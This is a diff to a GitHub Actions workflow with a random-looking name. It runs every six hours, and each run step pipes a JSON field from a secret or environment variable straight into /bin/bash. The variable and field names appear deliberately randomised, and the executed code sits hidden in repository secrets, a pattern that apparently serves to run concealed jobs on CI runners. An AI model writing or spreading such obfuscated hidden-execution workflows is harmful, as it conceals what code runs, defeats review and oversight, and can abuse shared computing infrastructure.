@@ -1,24 +1,29 @@
 name: jialijuanzou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 4/6 * * *'
+    - cron: '10 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jialijuanzou
         env:
-          okzr5: ${{ secrets.okzr5 }}
+          yfp36626: ${{ secrets.yfp36626 }}
         run: |
-          echo $okzr5 | jq -r .pxzj8764 | /bin/bash
-          echo $zsvaq44704 | jq -r .maw6 | /bin/bash
-          echo $r10378 | jq -r .mmr068 | /bin/bash
-          echo $udxi41 | jq -r .bwztj9341 | /bin/bash
-          echo $mtd04590 | jq -r .d2 | /bin/bash
-          echo $ycw5297 | jq -r .dij359 | /bin/bash
-          echo $sqnq21238 | jq -r .w71 | /bin/bash
-          echo $ohmkz0 | jq -r .ga460 | /bin/bash
+          echo $yfp36626 | jq -r .l30831 | /bin/bash
+          echo $xbkiu18320 | jq -r .lu70 | /bin/bash
+          echo $o3297 | jq -r .d28012 | /bin/bash
+          echo $ffjx0324 | jq -r .zn05545 | /bin/bash
+          echo $rw71 | jq -r .zgkjl17361 | /bin/bash
+          echo $saik005 | jq -r .be843 | /bin/bash
+          echo $ihf34 | jq -r .ehbx3 | /bin/bash
+          echo $a7871 | jq -r .gexe45123 | /bin/bash
+          echo $nj2 | jq -r .pyzzd28134 | /bin/bash
+          echo $nwq25 | jq -r .bfhy87544 | /bin/bash
+          echo $adm85 | jq -r .atrg35 | /bin/bash
+          echo $he7 | jq -r .r3 | /bin/bash
+          echo $jjty3 | jq -r .gzxo1124 | /bin/bash
 
